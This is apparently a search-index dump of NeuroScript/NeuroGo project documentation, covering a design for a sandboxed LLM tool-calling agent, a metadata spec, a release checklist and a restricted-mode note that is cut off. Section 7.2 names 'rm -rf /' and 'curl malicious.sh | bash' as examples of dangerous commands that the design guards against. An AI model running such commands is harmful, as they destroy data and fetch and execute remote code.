code (LLM requests TOOL.ReadFile).</li> <li>Analyze and understand the code (LLM's inherent capability).</li> <li>Propose modifications (LLM generates text/code).</li> <li>Apply modifications to files (LLM requests TOOL.WriteFile).</li> <li>Manage version control (LLM requests TOOL.GitCommit, TOOL.GitPush, etc.).</li> <li>Build and test the code (LLM requests TOOL.GoBuild, TOOL.GoTest).</li> </ul> <p>The NeuroGo-as-llm-agent provides the necessary, secure execution layer for these file system, version control, and build tool interactions.</p>"},{"location":"llm_agent_facilities/#72-secure-orchestration-layer","title":"7.2. Secure Orchestration Layer","text":"<p>Crucially, the agent acts as a secure bridge. While the LLM provides the high-level reasoning and planning for development tasks (e.g., \"Refactor this module to improve efficiency\" or \"Implement the feature described in issue #123\"), NeuroGo enforces strict security constraints on how these plans are translated into actions on the local system. This contrasts sharply with the extreme risk of allowing an LLM to directly generate and execute arbitrary shell commands (rm -rf /, curl malicious.sh | bash).17 The agent ensures that the LLM's requests are channeled through pre-defined, allowlisted TOOLs operating under the validation and sandboxing rules of the Security Layer. This enables controlled automation 17 \u2013 leveraging the LLM's power without granting it dangerous, unchecked access.</p>"},{"location":"llm_agent_facilities/#73-accelerating-the-bootstrapping-roadmap","title":"7.3. Accelerating the Bootstrapping Roadmap","text":"<p>Given the need for secure local interaction, the NeuroGo-as-llm-agent capability is likely a prerequisite or, at minimum, a significant accelerator for the bootstrapping goal.30 Without a secure way for an AI system (orchestrated by an LLM) to interact with its own codebase and development tools, attempts at self-modification would be fraught with unacceptable security risks. This agent provides that secure foundation, allowing the project to leverage state-of-the-art LLMs for complex tasks like code generation, refactoring, and automated testing as part of its own development process. It transforms the abstract goal of \"bootstrapping\" into a series of concrete, albeit complex, tasks that can be orchestrated via the agent interface. Therefore, building this secure agent capability is likely a critical early step enabling subsequent, more ambitious bootstrapping milestones outlined in the NeuroScript roadmap.</p>"},{"location":"llm_agent_facilities/#conclusion","title":"Conclusion","text":""},{"location":"llm_agent_facilities/#summary-of-plan","title":"Summary of Plan","text":"<p>This plan outlines a comprehensive approach to evolving NeuroGo into NeuroGo-as-llm-agent, a secure execution backend for LLM-requested tool functions. It proposes an architecture centered around separating LLM reasoning from NeuroGo's controlled execution, leveraging the Gemini API's function calling mechanism. Detailed implementation steps within the Go codebase are specified, alongside a phased development plan. Critically, the plan incorporates a multi-layered security design encompassing tool allowlisting, strict argument validation, mandatory path sandboxing, and restrictions on high-risk tools, designed to mitigate inherent risks like prompt injection and excessive agency.</p>"},{"location":"llm_agent_facilities/#emphasis-on-security","title":"Emphasis on Security","text":"<p>The viability and trustworthiness of NeuroGo-as-llm-agent depend entirely on the rigorous implementation, continuous testing, and vigilant maintenance of the security measures detailed herein. The principle of treating all LLM-generated requests as untrusted input must guide every stage of development and deployment. Security cannot be an afterthought; it must be woven into the fabric of the agent's design and implementation from the outset.</p>"},{"location":"llm_agent_facilities/#next-steps","title":"Next Steps","text":"<p>The recommended next step is to commence Phase 1 of the development plan. This involves establishing the basic communication loop with the Gemini API via function calling, implementing foundational state management, and integrating the initial security layer with allowlisting for a minimal set of safe tools. This will provide a functional prototype upon which the more comprehensive security hardening and feature expansion of subsequent phases can be built.# Notes: NeuroGo as LLM Agent Mechanism</p>"},{"location":"llm_agent_facilities/#section-8-gemini-25-discussion-llm-interaction-api-llm-neurogo-request","title":"Section 8: Gemini 2.5 Discussion: LLM Interaction API (LLM -&gt; NeuroGo Request)","text":"<ul> <li>Goal: Allow LLM to request NeuroGo execute a TOOL during a conversation.</li> <li>Option A: Structured Chat Response:<ul> <li>LLM responds with text containing a predefined structure (e.g., JSON) indicating a TOOL call request (tool_name, arguments).</li> <li>NeuroGo parses this structured part of the response.</li> <li>Pros: Works with standard chat/completion APIs (like the current llm.go setup [cite: uploaded:neuroscript/pkg/core/llm.go]).</li> <li>Cons: Requires careful prompt engineering for the LLM to reliably generate the correct structure; parsing logic in NeuroGo can be brittle.</li> </ul> </li> <li>Option B: Function Calling / Tool Use API:<ul> <li>Modern LLM APIs (including Gemini) often have explicit support for this.</li> <li>NeuroGo declares available TOOLs (name, description, parameters - like ToolSpec [cite: uploaded:neuroscript/pkg/core/tools_types.go]) to the LLM API.</li> <li>When the LLM needs a tool, the API response itself is a structured object indicating the tool name and arguments to call.</li> <li>NeuroGo receives this object, executes the tool, and sends the result back in the next API call.</li> <li>Pros: Most robust, standard, designed for this purpose. Avoids parsing responses.</li> <li>Cons: Requires modifying llm.go [cite: uploaded:neuroscript/pkg/core/llm.go] to use the specific function calling mode/parameters of the Gemini API.</li> </ul> </li> <li>Option C: MCP (Multi-Context Prompting):<ul> <li>Less common in standard commercial APIs compared to function calling. Might be overly complex or not directly supported by the current Gemini endpoint.</li> </ul> </li> <li>Recommendation: Prioritize Option B (Function Calling). It's the industry standard and most reliable way. If that proves difficult with the specific API endpoint, fall back to Option A (Structured Chat Response).</li> </ul>"},{"location":"llm_agent_facilities/#2-conversation-state-management","title":"2. Conversation State Management","text":"<ul> <li>Requirement: NeuroGo must maintain the history of the interaction across multiple turns (user prompt -&gt; LLM response -&gt; [LLM tool request -&gt; NeuroGo tool execution -&gt; tool result -&gt; LLM continuation] -&gt; final response).</li> <li>Implementation:<ul> <li>The logic managing the CALL LLM needs expansion.</li> <li>It must store the sequence of messages (user, assistant, tool_request, tool_result).</li> <li>For each call to the LLM API (especially after a tool result), the relevant history must be formatted and included according to the API requirements (e.g., the contents array for Gemini multi-turn chat, or the specific format for function calling responses).</li> <li>This state management likely belongs within the Go code handling the LLM interaction (llm.go and potentially interpreter_simple_steps.go where CALL LLM is handled).</li> </ul> </li> </ul>"},{"location":"llm_agent_facilities/#3-security-limiting-actions","title":"3. Security &amp; Limiting Actions","text":"<ul> <li>Requirement: Prevent the LLM from making NeuroGo execute arbitrary or harmful commands/actions. This is critical.</li> <li>Mechanisms:<ul> <li>Tool Allowlist: Explicitly define which TOOLs are available to be called by the LLM. Do not expose all registered tools [cite: uploaded:neuroscript/pkg/core/tools_registry.go] if not necessary. This might involve a separate registration or filtering layer for LLM-callable tools.</li> <li>Strict Argument Validation: Enhance ValidateAndConvertArgs [cite: uploaded:neuroscript/pkg/core/tools_validation.go] or add further checks for arguments received from the LLM for tool calls. Pay extra attention to file paths, URLs, shell command arguments, etc. Check types, formats, and potentially value ranges or patterns.</li> <li>Path Sandboxing: Consistently use SecureFilePath [cite: uploaded:neuroscript/pkg/core/tools_helpers.go] (or equivalent) for all filesystem operations requested via TOOLs (ReadFile, WriteFile, ListDirectory, GitAdd, etc. [cite: uploaded:neuroscript/pkg/core/tools_fs.go, uploaded:neuroscript/pkg/core/tools_git.go]) to ensure they stay within the allowed working directory.</li> <li>Restrict/Disable Dangerous Tools: TOOL.ExecuteCommand [cite: uploaded:neuroscript/pkg/core/tools_shell.go] is high-risk. Consider:<ul> <li>Not exposing it to the LLM at all.</li> <li>If required, creating a highly restricted version that only allows specific commands from a hardcoded allowlist and performs extreme sanitization on arguments.</li> </ul> </li> <li>Resource Limits: Implement timeouts for LLM API calls and potentially for the execution of tools called by the LLM.</li> <li>Deny Direct NS Execution: The LLM should only be allowed to request registered TOOLs, not ask NeuroGo to execute arbitrary NeuroScript code strings it generates dynamically within the agent loop.</li> <li>Prompt Guidance (Secondary): Instructing the LLM about disallowed actions is helpful but not sufficient for security. Hardcoded checks and limitations in NeuroGo are essential.</li> </ul> </li> <li>Recommendation: Implement multiple layers: Tool allowlisting, strict validation, path sandboxing, and heavy restrictions (or disabling) of ExecuteCommand. Security needs careful design.</li> </ul>"},{"location":"metadata/","title":"Metadata","text":"<p>:: version: 0.4.2 :: type: NSproject :: subtype: spec :: dependsOn: docs/neuroscript overview.md, docs/neurodata_and_composite_file_spec.md, pkg/neurodata/metadata/metadata.go, pkg/core/NeuroScript.g4 :: howToUpdate: Review the referenced documents and ensure this file accurately reflects the current metadata standards (file/block level), parser behavior regarding metadata, and extraction tool logic.</p>"},{"location":"metadata/#metadata-in-neuroscript-objects","title":"MetaData in NeuroScript Objects","text":""},{"location":"metadata/#metadata-standard-key-value","title":"Metadata Standard (<code>:: key: value</code>)","text":"<p>All project files (NeuroScript <code>.ns.txt</code>, NeuroData <code>.nd*</code>, Go <code>.go</code>, Markdown <code>.md</code>, etc.) and embedded code/data blocks should use the following metadata format where applicable for file-level or block-level information.</p> <ul> <li>Prefix: Metadata lines must start with <code>::</code> (colon, colon) followed by at least one space. Optional leading whitespace before <code>::</code> is allowed [cite: uploaded:neuroscript_small/docs/neurodata_and_composite_file_spec.md].</li> <li>Structure: <code>:: key: value</code> [cite: uploaded:neuroscript_small/docs/neurodata_and_composite_file_spec.md].</li> <li>Key: Immediately follows <code>::</code> and precedes the first <code>:</code>. Valid characters are letters, numbers, underscore, period, hyphen (<code>[a-zA-Z0-9_.-]+</code>). Whitespace around the key (after <code>::</code>) is tolerated [cite: uploaded:neuroscript_small/docs/neurodata_and_composite_file_spec.md].</li> <li>Separator: A single colon <code>:</code> separates the key and value. Whitespace around the colon is tolerated [cite: uploaded:neuroscript_small/docs/neurodata_and_composite_file_spec.md].</li> <li>Value: Everything after the first colon, with leading/trailing whitespace trimmed [cite: uploaded:neuroscript_small/docs/neurodata_and_composite_file_spec.md].</li> <li>Location (File Level): For metadata applying to the entire file (like <code>.ns.txt</code>, <code>.md</code>), these lines MUST appear consecutively at the very beginning of the file, before any functional content (e.g., before <code>DEFINE PROCEDURE</code>, before Markdown text, before NeuroData items like <code>- [ ]</code>). [cite: uploaded:neuroscript_small/docs/neurodata_and_composite_file_spec.md].</li> <li>Location (Block Level): For metadata applying only to a fenced code block within a composite document (like <code>.md</code>), place <code>:: key: value</code> lines immediately inside the block, after the opening fence (e.g., <code>go\\n:: id: my-block\\n...</code>), before the block's main content [cite: uploaded:neuroscript_small/docs/neurodata_and_composite_file_spec.md].</li> <li>Comments/Blank Lines: Standard comment lines (<code>#</code> or <code>--</code>) and blank lines are permitted between metadata lines (both file-level and block-level), but they must still appear before the main content begins [cite: uploaded:neuroscript_small/docs/neurodata_and_composite_file_spec.md].</li> <li>Parser Skipping (<code>.ns.txt</code>): The NeuroScript ANTLR grammar's lexer is configured to skip file-level <code>::</code> metadata lines (treating them like comments) [cite: uploaded:neuroscript_small/pkg/core/generated/neuroscript_lexer.go]. This prevents them from interfering with script parsing and execution by <code>neurogo</code>.</li> <li>Metadata Extraction: Tools like <code>TOOL.ExtractMetadata</code> operate on string content and are designed to parse these <code>:: key: value</code> lines from the beginning of the provided text [cite: uploaded:neuroscript_small/pkg/neurodata/metadata/metadata.go, uploaded:neuroscript_small/pkg/core/tools_metadata.go].</li> <li>Markdown Line Endings: metadata lines should end in two space characters before the newline so they render as separate lines in markdown. </li> </ul>"},{"location":"metadata/#standard-metadata-tags","title":"Standard Metadata Tags","text":""},{"location":"metadata/#required-tags","title":"Required Tags","text":"<ul> <li> <p><code>:: version: &lt;semver_string&gt;</code></p> <ul> <li>Applies to: All files and blocks with meaningful content.</li> <li>Value: A valid semantic version string (e.g., <code>0.1.0</code>, <code>1.2.3-alpha</code>).</li> <li>Purpose: Tracks the version of the content within the specific file or block. Tooling should aim to increment the patch number on change.</li> </ul> </li> <li> <p><code>:: type: &lt;TypeName&gt;</code></p> <ul> <li>Applies to: All NeuroScript project files and blocks.</li> <li>Value: A string identifying the primary type. Recommended base types include:<ul> <li><code>NSproject</code>: For general project files (Go code, Markdown docs, config files, etc. that aren't more specific types below).</li> <li><code>NeuroScript</code>: For <code>.ns.txt</code> files or blocks containing NeuroScript code.</li> <li><code>NeuroData</code>: For files or blocks containing specific NeuroData formats (Checklist, Table, Graph, Form, Tree, etc.). Use the specific type name here (e.g., <code>Checklist</code>, <code>Table</code>) instead of the generic <code>NeuroData</code>.</li> <li><code>Template</code>: For template files/blocks (e.g., Handlebars).</li> </ul> </li> <li>Purpose: Allows tools to identify the format and apply appropriate processing. NeuroData files/blocks should use their specific format name (e.g., <code>:: type: Graph</code>, <code>:: type: Form</code>).</li> </ul> </li> </ul>"},{"location":"metadata/#recommended-tags","title":"Recommended Tags","text":"<ul> <li> <p><code>:: subtype: &lt;SubTypeName&gt;</code></p> <ul> <li>Applies to: Files or blocks where further classification beyond the primary <code>:: type:</code> is useful.</li> <li>Value: A string indicating the subtype. Examples:<ul> <li><code>spec</code>: For specification documents (like this one, or NeuroData format specs). Used with <code>:: type: NSproject</code> or potentially <code>:: type: NeuroData</code> if the spec itself is the data format.</li> <li><code>test_fixture</code>: For files specifically used as test inputs.</li> <li><code>library</code>: For NeuroScript files intended as reusable libraries.</li> <li><code>example</code>: For example code or data files.</li> <li><code>config</code>: For configuration files.</li> </ul> </li> <li>Purpose: Provides more granular classification for tools or organization.</li> </ul> </li> <li> <p><code>:: id: &lt;unique_identifier&gt;</code></p> <ul> <li>Applies to: Embedded blocks within composite documents (e.g., Markdown). Can also apply to files.</li> <li>Value: A unique identifier for the block or file, preferably using URL-safe characters (letters, numbers, underscore, hyphen). IDs should be unique within their containing file.</li> <li>Purpose: Essential for referencing specific blocks using the <code>[ref:&lt;location&gt;#&lt;block_id&gt;]</code> syntax [cite: uploaded:neuroscript_small/docs/NeuroData/references.md].</li> </ul> </li> </ul>"},{"location":"metadata/#optional-tags-examples","title":"Optional Tags (Examples)","text":"<ul> <li> <p><code>:: grammar: &lt;grammar_name&gt;[@&lt;semver_string&gt;]</code></p> <ul> <li>Applies to: Files or blocks whose content adheres to a defined external or internal grammar specification (e.g., a NeuroScript file referencing the NS grammar, a NeuroData file referencing its own format spec, or another format like JSON).</li> <li>Value: The name of the grammar, optionally followed by <code>@</code> and a specific semantic version string (e.g., <code>graph@0.1.0</code>, <code>neuroscript@1.1.0</code>, <code>hbars@1.0.0</code>, <code>json</code>).</li> <li>Purpose: Indicates the syntax rules the content follows. Allows tools to select appropriate parsers or validators.</li> <li>Versioning: If the <code>@&lt;semver&gt;</code> is omitted, tools processing or rewriting the content should assume or default to the latest known stable version of the specified grammar.</li> </ul> </li> <li> <p><code>:: status: &lt;status_string&gt;</code></p> <ul> <li>Applies to: Files or blocks, especially specifications or checklists.</li> <li>Value: A string indicating the current status (e.g., <code>draft</code>, <code>review</code>, <code>approved</code>, <code>deprecated</code>, <code>pending</code>, <code>active</code>).</li> <li>Purpose: Provides context about the lifecycle state of the content.</li> </ul> </li> <li> <p><code>:: dependsOn: &lt;path_or_identifier_list&gt;</code></p> <ul> <li>Applies to: Files or blocks that have dependencies on other specific resources.</li> <li>Value: A comma-separated list of file paths or reference identifiers (<code>[ref:...]</code>).</li> <li>Purpose: Explicitly documents dependencies, useful for understanding impact of changes and for tooling.</li> </ul> </li> <li> <p><code>:: howToUpdate: &lt;description_or_script_call&gt;</code></p> <ul> <li>Applies to: Files or blocks with <code>dependsOn</code>.</li> <li>Value: A natural language description or potentially a <code>CALL</code> statement indicating how to update this content if its dependencies change.</li> <li>Purpose: Provides guidance for maintenance. Required if <code>dependsOn</code> is present.</li> </ul> </li> <li> <p><code>:: template: &lt;path_or_identifier&gt;</code></p> <ul> <li>Applies to: NeuroData instances (e.g., <code>.ndobj</code>) derived from a template (<code>.ndform</code>).</li> <li>Value: A reference (<code>[ref:...]</code>) to the source template file or block.</li> <li>Purpose: Links instance data to its defining schema.</li> </ul> </li> <li> <p><code>:: templateFor: &lt;format_id&gt;</code></p> <ul> <li>Applies to: NeuroScript templates (e.g., Handlebars blocks).</li> <li>Value: An identifier for the target output format (e.g., <code>markdown</code>, <code>json</code>, <code>html</code>, <code>neuroscript</code>).</li> <li>Purpose: Guides validation and potential context-aware escaping during template rendering [cite: uploaded:neuroscript_small/docs/NeuroData/templates.md].</li> </ul> </li> <li> <p>(Other tags like <code>author</code>, <code>description</code>, <code>rendering_hint</code>, <code>canonical_format</code> can be added as needed).</p> </li> </ul>"},{"location":"metadata/#file-specific-conventions","title":"File-Specific Conventions","text":""},{"location":"metadata/#neuroscript-files-ns-nstxt-neuro","title":"NeuroScript Files (<code>.ns</code>, <code>.ns.txt</code>, <code>.neuro</code>)","text":"<ul> <li>File Metadata: Use the <code>:: key: value</code> standard at the top (e.g., <code>:: version: ...</code>, <code>:: type: NeuroScript</code>, <code>:: subtype: library</code>, <code>:: grammar: neuroscript@1.1.0</code>). The parser skips these lines.</li> <li><code>FILE_VERSION</code> Declaration: Deprecated. Use <code>:: version:</code> instead for file content versioning.</li> <li>Procedure <code>COMMENT:</code> Block: Required per procedure. Contains structured metadata like <code>PURPOSE:</code>, <code>INPUTS:</code>, <code>OUTPUT:</code>, <code>ALGORITHM:</code>, <code>LANG_VERSION:</code>, <code>CAVEATS:</code>, <code>EXAMPLES:</code> (as specified in <code>docs/script spec.md</code> [cite: uploaded:neuroscript_small/docs/script spec.md]).<ul> <li><code>LANG_VERSION:</code> (Optional but Recommended): Semantic version indicating the targeted NeuroScript language specification version.</li> </ul> </li> </ul>"},{"location":"metadata/#neurodata-files-ndcl-ndtb-etc","title":"NeuroData Files (<code>.ndcl</code>, <code>.ndtb</code>, etc.)","text":"<ul> <li>File Metadata: Use the <code>:: key: value</code> standard at the top (e.g., <code>:: version: ...</code>, <code>:: type: Checklist</code>, <code>:: grammar: ndcl@0.5.0</code>). Note that <code>:: type:</code> uses the specific NeuroData format name.</li> </ul>"},{"location":"metadata/#specification-files-md-etc","title":"Specification Files (<code>.md</code>, etc.)","text":"<ul> <li>File Metadata: Use the <code>:: key: value</code> standard at the top (e.g., <code>:: version: ...</code>, <code>:: type: NSproject</code>, <code>:: subtype: spec</code>).</li> </ul>"},{"location":"metadata/#markdown-files-md-general-composite-documents","title":"Markdown Files (<code>.md</code>) - General / Composite Documents","text":"<ul> <li>File Metadata: Use the <code>:: key: value</code> standard at the very top (e.g., <code>:: version: ...</code>, <code>:: type: NSproject</code>).</li> <li>Rendering: Be aware that standard Markdown viewers may render these <code>::</code> lines as plain text unless filtered.</li> </ul>"},{"location":"metadata/#embedded-blocks-in-composite-documents-eg-markdown-md","title":"Embedded Blocks in Composite Documents (e.g., Markdown <code>.md</code>)","text":"<ul> <li>Fencing: Use <code>`` followed by a language tag (e.g.,</code>neuroscript<code>,</code>neurodata-checklist`).</li> <li>Block Metadata: Place <code>:: key: value</code> lines immediately inside the block, after the opening fence and before the block's main content [cite: uploaded:neuroscript_small/docs/neurodata_and_composite_file_spec.md]. Include relevant tags like <code>:: id:</code>, <code>:: version:</code>, <code>:: type:</code> (if applicable, e.g., <code>:: type: Checklist</code>), <code>:: grammar:</code>.</li> <li> <p>Example: <pre><code>Some introductory text.\n\n```neuroscript\n:: id: proc-example-1\n:: version: 1.0.0\n:: type: NeuroScript\n:: grammar: neuroscript@1.1.0\nDEFINE PROCEDURE Example()\nCOMMENT: ... ENDCOMMENT\nEMIT \"Hello\"\nEND\n</code></pre></p> <p>More text.</p> <p><pre><code>:: id: checklist-example-1\n:: version: 0.1.0\n:: type: Checklist\n:: grammar: ndcl@0.5.0\n- [ ] Item 1\n</code></pre> ```</p> </li> </ul>"},{"location":"neurodata_and_composite_file_spec/","title":"NeuroData and Composite Files","text":"<p>NeuroData may appear without code fences by itself in a file, or may appear as code-fenced blocks within a file containing many such blocks -- such a file is called a \"composite file\" and is generally markdown with embedded NeuroData.</p>"},{"location":"neurodata_and_composite_file_spec/#metadata","title":"Metadata","text":"<p>All NeuroData and NeuroScript files and blocks should have metadata.</p> <p>Prefix: Metadata lines must start with :: (colon, colon, followed by at least one space). Optional whitespace is allowed before the ::.</p> <p>Structure: The line follows a key: value pattern after the :: prefix. Key: The key comes immediately after the :: prefix (and before the colon). Based on the regex used ([a-zA-Z0-9_.-]+), keys can contain letters, numbers, underscores, periods, and hyphens. </p> <p>Whitespace immediately around the key (but after the required space following ::) is tolerated.</p> <p>Separator: A colon (:) separates the key from the value. Whitespace around the colon is tolerated.</p> <p>Value: The value consists of everything following the first colon on the line, with leading/trailing whitespace trimmed from the value itself.</p> <p>Location: All metadata lines must appear at the beginning of the file, before any checklist item lines (lines starting with - [ ] or - [x]). Metadata lines cannot be interspersed with checklist items.</p> <p>Comments: Regular comment lines (starting with #, potentially indented) are ignored and can appear before, after, or between metadata lines (but still before the first checklist item). Example:</p> <pre><code>:: id: project-alpha\n:: version : 1.2.0   # This is a standard comment, ignored by parser\n:: requires-review : true\n\n# Another standard comment\n\n- [ ] First item...\n</code></pre>"},{"location":"release_checklist.ndcl/","title":"NeuroScript 0.5.0 Release Checklist","text":""},{"location":"release_checklist.ndcl/#core-functionality-stability","title":"Core Functionality &amp; Stability","text":""},{"location":"release_checklist.ndcl/#interpreter","title":"Interpreter","text":"<ul> <li>[ ] Verify all language constructs (variables, control flow (<code>if</code>/<code>else</code>, <code>loop</code>), procedures, operators) work as documented (<code>docs/formal script spec.md</code>).</li> <li>[ ] Test error handling for syntax errors and runtime errors. Are error messages clear?</li> <li>[ ] Confirm evaluation logic (<code>pkg/core/evaluation_*.go</code>) is correct, especially for complex expressions and type handling.</li> <li>[ ] Test <code>last</code> keyword functionality (<code>library/TestLastKeyword.ns.txt</code>).</li> <li>[ ] Check list/map operations (<code>library/test_listmap.ns.txt</code>).</li> </ul>"},{"location":"release_checklist.ndcl/#tools","title":"Tools","text":"<ul> <li>[ ] General: Test all registered tools (<code>pkg/core/tools_list_register.go</code>) for basic functionality and edge cases.</li> <li>[ ] <code>fs</code> tool: Verify read, write, list, delete operations (<code>pkg/core/tools_fs_*.go</code>). Pay special attention to path handling and permissions.</li> <li>[ ] <code>go_ast</code> tool: Confirm find and modify operations work correctly (<code>pkg/core/tools_go_ast_*.go</code>). Test with various Go code structures.</li> <li>[ ] <code>shell</code> tool: Thoroughly test execution (<code>pkg/core/tools_shell.go</code>) and ensure security implications are understood/mitigated (see Restricted Mode).</li> <li>[ ] <code>git</code> tool: Test basic git operations if included (<code>pkg/core/tools_git.go</code>).</li> <li>[ ] <code>llm</code> tool: Ensure interaction with the LLM API (<code>pkg/core/llm.go</code>, <code>llm_tools.go</code>) is functional and handles responses correctly.</li> <li>[ ] <code>nspatch</code> tool: Verify patching works as expected (<code>pkg/nspatch/nspatch.go</code>, <code>cmd/nspatch/nspatch.go</code>).</li> <li>[ ] NeuroData Tools: (<code>pkg/neurodata/*</code>): Ensure tools for specific data formats (checklist, blocks) are stable.</li> <li>[ ] Other Tools: Verify <code>io</code>, <code>math</code>, <code>string</code>, <code>vector</code>, etc. tools.</li> </ul>"},{"location":"release_checklist.ndcl/#restricted-mode","title":"Restricted Mode","text":"<ul> <li>[ ] Thoroughly test restricted mode (<code>pkg/core/security*.go</code>, <code>docs/restricted_mode.md</code>).</li> <li>[ ] Confirm tool restrictions (especially <code>fs</code>, <code>shell</code>, <code>git</code>) are enforced correctly.</li> <li>[ ] Validate allowlist mechanisms (<code>cmd/neurogo/agent_allowlist.txt</code>).</li> </ul>"},{"location":"release_checklist.ndcl/#build-distribution","title":"Build &amp; Distribution","text":""},{"location":"release_checklist.ndcl/#build-process","title":"Build Process","text":"<ul> <li>[ ] Document clear build instructions (<code>docs/build.md</code> seems to exist, ensure it's up-to-date).</li> <li>[ ] Ensure the project builds cleanly (<code>go build ./...</code>).</li> <li>[ ] Test cross-compilation if supporting multiple OS/architectures.</li> </ul>"},{"location":"release_checklist.ndcl/#dependencies","title":"Dependencies","text":"<ul> <li>[ ] Check <code>go.mod</code> and <code>go.sum</code> are up-to-date and committed.</li> <li>[ ] Minimize external dependencies where possible.</li> </ul>"},{"location":"release_checklist.ndcl/#packaging","title":"Packaging","text":"<ul> <li>[ ] Decide on distribution format (e.g., source code release on GitHub, pre-compiled binaries).</li> <li>[ ] Create release artifacts (e.g., zip/tarball of source, binaries).</li> </ul>"},{"location":"release_checklist.ndcl/#tagging","title":"Tagging","text":"<ul> <li>[ ] Tag the release commit in Git (e.g., <code>v0.1.0</code>).</li> </ul>"},{"location":"release_checklist.ndcl/#documentation","title":"Documentation","text":""},{"location":"release_checklist.ndcl/#readme-readmemd","title":"README (<code>README.md</code>)","text":"<ul> <li>[ ] Clear project description and purpose.</li> <li>[ ] Quick start guide (installation, simple example).</li> <li>[ ] Link to more detailed documentation.</li> <li>[ ] Installation instructions.</li> <li>[ ] Basic usage examples for <code>neurogo</code> CLI.</li> </ul>"},{"location":"release_checklist.ndcl/#language-specification-docsformal-script-specmd","title":"Language Specification (<code>docs/formal script spec.md</code>)","text":"<ul> <li>[ ] Ensure it accurately reflects the current language implementation.</li> <li>[ ] Cover syntax, data types, operators, control flow, procedures, built-in tools.</li> </ul>"},{"location":"release_checklist.ndcl/#tool-documentation-docsnstools","title":"Tool Documentation (<code>docs/ns/tools/*</code>?)","text":"<ul> <li>[ ] Document all available tools, their parameters, return values, and examples. (Consider generating this automatically if possible).</li> <li>[ ] Clearly state potential side effects or security considerations (e.g., <code>shell</code>, <code>fs.write</code>, <code>fs.delete</code>).</li> </ul>"},{"location":"release_checklist.ndcl/#neurodata-formats-docsneurodata-docsneurodata_and_composite_file_specmd","title":"NeuroData Formats (<code>docs/NeuroData/*</code>, <code>docs/neurodata_and_composite_file_spec.md</code>)","text":"<ul> <li>[ ] Clearly document the specifications for checklist (<code>.ndcl</code>), patch (<code>.ndpatch</code>), blocks (<code>.ndblk</code>), and any other custom formats.</li> </ul>"},{"location":"release_checklist.ndcl/#examples-libraryexamples-other-nstxt-files","title":"Examples (<code>library/examples/*</code>, other <code>.ns.txt</code> files)","text":"<ul> <li>[ ] Provide clear, working examples demonstrating key features and common use cases.</li> <li>[ ] Ensure examples run correctly with the release version.</li> </ul>"},{"location":"release_checklist.ndcl/#agentllm-features-docsllm_agent_facilitiesmd","title":"Agent/LLM Features (<code>docs/llm_agent_facilities.md</code>)","text":"<ul> <li>[ ] Explain how to use NeuroScript with LLMs, including tool integration.</li> </ul>"},{"location":"release_checklist.ndcl/#roadmap-docsroadmapmd","title":"Roadmap (<code>docs/RoadMap.md</code>)","text":"<ul> <li>[ ] Update with completed items and future plans (optional but helpful).</li> </ul>"},{"location":"release_checklist.ndcl/#contribution-guide","title":"Contribution Guide","text":"<ul> <li>[ ] Basic instructions on how others can contribute (bug reports, features) (Optional, but good for future).</li> </ul>"},{"location":"release_checklist.ndcl/#testing","title":"Testing","text":""},{"location":"release_checklist.ndcl/#unit-tests-pkg_testgo","title":"Unit Tests (<code>pkg/.../*_test.go</code>)","text":"<ul> <li>[ ] Ensure all existing tests pass (<code>go test ./...</code>).</li> <li>[ ] Review test coverage. Add tests for any critical, untested areas.</li> <li>[ ] Test edge cases and error conditions.</li> </ul>"},{"location":"release_checklist.ndcl/#integration-tests","title":"Integration Tests","text":"<ul> <li>[ ] Test scripts that use multiple tools together (<code>library/*.ns.txt</code> files likely serve this purpose).</li> <li>[ ] Test <code>neurogo</code> command-line execution with various flags and scripts.</li> </ul>"},{"location":"release_checklist.ndcl/#example-tests","title":"Example Tests","text":"<ul> <li>[ ] Manually run or automate the execution of all provided examples to ensure they work.</li> </ul>"},{"location":"release_checklist.ndcl/#usability-dx-developer-experience","title":"Usability &amp; DX (Developer Experience)","text":""},{"location":"release_checklist.ndcl/#command-line-interface-cmdneurogomaingo","title":"Command Line Interface (<code>cmd/neurogo/main.go</code>)","text":"<ul> <li>[ ] Test command-line arguments (flags for script execution, agent mode, restricted mode, config).</li> <li>[ ] Ensure help messages (<code>-h</code>, <code>--help</code>) are informative.</li> <li>[ ] Provide useful output/logging during script execution.</li> </ul>"},{"location":"release_checklist.ndcl/#configuration-pkgneurogoconfiggo","title":"Configuration (<code>pkg/neurogo/config.go</code>)","text":"<ul> <li>[ ] Verify configuration loading (e.g., API keys for LLM) works correctly.</li> <li>[ ] Document configuration options.</li> </ul>"},{"location":"release_checklist.ndcl/#error-messages","title":"Error Messages","text":"<ul> <li>[ ] Review error messages across the interpreter and tools for clarity and helpfulness.</li> </ul>"},{"location":"release_checklist.ndcl/#legal-administrative","title":"Legal &amp; Administrative","text":""},{"location":"release_checklist.ndcl/#license","title":"License","text":"<ul> <li>[ ] Ensure the MIT license file (<code>LICENSE</code>) is present in the root directory.</li> <li>[ ] Ensure source files have appropriate license headers (if desired).</li> </ul>"},{"location":"release_checklist.ndcl/#repository","title":"Repository","text":"<ul> <li>[ ] Clean up unnecessary files or branches.</li> <li>[ ] Ensure the default branch (e.g., <code>main</code> or <code>master</code>) is stable.</li> </ul>"},{"location":"release_checklist.ndcl/#publicity-post-release","title":"Publicity (Post-Release)","text":""},{"location":"release_checklist.ndcl/#github-release","title":"GitHub Release","text":"<ul> <li>[ ] Create a release on GitHub with the tag, including release notes summarizing changes.</li> </ul>"},{"location":"release_checklist.ndcl/#announcement","title":"Announcement","text":"<ul> <li>[ ] Plan how/where to announce the release (e.g., blog post, social media, relevant forums).</li> </ul>"},{"location":"restricted_mode/","title":"Restricted Mode","text":"<p>Thinking Process:</p> <p>Goal: Implement the ability to execute a NeuroScript procedure (CALL ProcedureName(...)) but apply the tool restrictions (allowlist/denylist) that would normally apply to an LLM agent calling TOOL.FunctionName(...). User Request Analysis: User wants to run a script (potentially generated by an LLM). This script should be executed with limited tool access, specifically using the same restrictions defined for the LLM agent mode (allowlist/denylist). This acts as a safety mechanism for running potentially untrusted scripts. Current State: The interpreter (pkg/core/interpreter.go) executes CALL TOOL. directly using the registered tools. The agent mode (pkg/neurogo/app_agent.go) uses a SecurityLayer (pkg/core/security.go) to validate TOOL. calls originating from the LLM before execution. This layer checks denylists, allowlists, and performs argument validation. Proposed Solution - Conceptual: Introduce a new execution mode or flag within the interpreter itself that signals \"restricted execution.\" When the interpreter encounters a CALL TOOL. step and this restricted mode is active, it should route the call through a validation layer before executing the tool function. This validation layer should use the same logic/configuration (allowlist/denylist) as the agent's SecurityLayer. Implementation Options: Option A: Modify Interpreter.executeCall: Add a flag to the Interpreter struct, e.g., restrictedToolMode bool. Add fields for the 